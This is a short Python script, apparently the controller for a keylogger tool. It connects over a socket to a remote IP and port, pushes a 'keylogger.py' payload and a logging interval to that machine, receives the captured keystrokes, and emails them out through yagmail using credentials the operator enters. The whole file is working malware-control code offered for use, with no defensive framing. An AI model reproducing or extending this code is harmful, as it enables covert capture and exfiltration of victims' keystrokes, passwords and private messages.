"""
Reference:
1) https://pypi.org/project/yagmail/
"""

from termcolor import colored
from installer import install
import getpass
import socket,time

try:
	import yagmail
except:
	install("yagmail")

def keylogger(ip,port):

	sock = socket.socket()
	sock.connect((ip,port))

	interval = input("Enter time interval to log the keystrokes: ")

	file = open('keylogger.py','rb')
	line = file.read(1024)

	while(line):
#		print (line.decode())
		sock.send(line)
		line = file.read(1024)

	file.close()
	sock.send("end of file".encode())

#	print ("Script transmitted!")

	time.sleep(1)

	line = "LOG_INTERVAL = " + interval + "\n"
	sock.send(line.encode())

#	print ("Interval transmitted!")
	print (colored(f"\nWaiting for server to log keystrokes and transfer...\n",'yellow'))

	outputfile = "server_keylog.txt"

	line = sock.recv(1024)
	if len(line) > 2:
		file = open(outputfile,'wb')
		while(line):
			file.write(line)
			line = sock.recv(1024)
		file.close()
		sendlogs(outputfile)
	else:
		print (colored(f"\nFailed to receive key strokes\n",'red'))

def sendlogs(log):

	message = ''
	with open(log,'r') as file:
		line = file.read()
		while(line):
			message = message + line
			line = file.read()

	file.close()

	print ()
	EMAIL_ADDRESS = input("Enter email address to send logs: ")
	EMAIL_PASSWORD = getpass.getpass(prompt="Enter password of email: ")
	print ()

	try:
		yag = yagmail.SMTP(EMAIL_ADDRESS, EMAIL_PASSWORD)
		contents = ["Logs: ", message]
		yag.send(EMAIL_ADDRESS, "Subject: Logs", contents)
	except Exception as e:
		print (colored(f'\nFailed to mail logs because of exception:\n{e}\n','red'))
